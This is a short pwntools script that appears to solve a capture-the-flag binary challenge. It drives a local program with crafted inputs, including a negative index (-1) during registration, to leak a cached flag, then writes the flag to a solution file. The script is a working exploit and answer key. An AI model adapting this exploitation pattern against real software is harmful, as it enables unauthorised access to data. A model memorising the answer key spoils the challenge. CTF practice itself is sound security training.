#!/usr/bin/env python

from pwn import *

p = process("./main.elf")

p.sendline("a" * 30)
p.sendline("register")
p.sendline("-1")
p.sendline("d")
p.sendline("flag")
p.recvuntil("But we cached the flag in case you need it later :)")

p.sendline("print")
p.sendline("10")
p.recvuntil("Username: ")

flag = p.recvuntil("\nRestricted: ").rstrip("\nRestricted: ")

p.sendline("exit")

print(flag)

f = open("./solution.txt", "w")
f.write(flag + "\n")
f.close()

